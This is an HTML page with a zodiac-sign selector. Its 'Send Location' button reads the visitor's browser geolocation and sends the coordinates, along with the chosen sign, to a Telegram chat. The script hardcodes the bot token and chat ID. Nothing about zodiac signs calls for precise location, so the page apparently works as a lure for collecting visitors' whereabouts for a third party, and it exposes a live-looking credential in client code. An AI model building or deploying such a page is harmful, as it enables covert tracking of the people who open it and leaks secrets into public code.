<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Location and Zodiac</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 50px;
        }
        button {
            padding: 10px 20px;
            background-color: #4CAF50;
            color: white;
            border: none;
            cursor: pointer;
        }
        button:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>

    <h2>Select Your Zodiac Sign</h2>
    <select id="zodiac" name="zodiac">
        <option value="Aries">Aries</option>
        <option value="Taurus">Taurus</option>
        <option value="Gemini">Gemini</option>
        <option value="Cancer">Cancer</option>
        <option value="Leo">Leo</option>
        <option value="Virgo">Virgo</option>
        <option value="Libra">Libra</option>
        <option value="Scorpio">Scorpio</option>
        <option value="Sagittarius">Sagittarius</option>
        <option value="Capricorn">Capricorn</option>
        <option value="Aquarius">Aquarius</option>
        <option value="Pisces">Pisces</option>
    </select>

    <br><br>
    <button onclick="sendLocation()">Send Location</button>

    <script>
        function sendLocation() {
            const zodiac = document.getElementById("zodiac").value;
            
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    const latitude = position.coords.latitude;
                    const longitude = position.coords.longitude;
                    const message = `Zodiac: ${zodiac}, Location: Latitude = ${latitude}, Longitude = ${longitude}`;
                    sendMessageToTelegram(message);
                }, function(error) {
                    alert("Error getting location.");
                });
            } else {
                alert("Geolocation is not supported by this browser.");
            }
        }

        function sendMessageToTelegram(message) {
            const botToken = '7784284083:AAG31myfjSw1T-MTExDj837RQQBKtms8wYk';  // Your Bot Token
            const chatId = '397599597';  // Your Chat ID
            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

            fetch(url)
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        alert("Location sent successfully!");
                    } else {
                        alert("Error sending location.");
                    }
                })
                .catch(error => {
                    alert("Error with the request.");
                    console.error("Error:", error);
                });
        }
    </script>

</body>
</html>
